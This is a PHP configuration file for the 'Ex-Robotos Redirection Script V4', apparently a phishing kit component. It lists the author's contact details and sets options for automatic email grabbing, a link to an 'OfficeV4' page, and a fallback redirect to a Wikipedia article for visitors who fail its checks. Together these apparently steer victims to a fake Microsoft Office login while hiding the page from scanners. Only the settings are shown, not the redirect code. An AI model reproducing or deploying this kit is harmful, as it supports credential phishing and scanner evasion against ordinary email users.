<?php
/* 
Ex-Robotos Redirection Script V4 2020
Email: ex.robotos.official@gmail.com
Facebook: facebook.com/Ex.Robotos
ICQ: @Ex.Robotos
*/
$autoEmail="true";//"true":Auto email grabing "false":without auto email grabing
$pagelink="http://domain.com/OfficeV4";
$FailRedirect="https://www.wikipedia.org/wiki/Microsoft_Office";
$redirecttype="2";// 1:header - 2:script
?>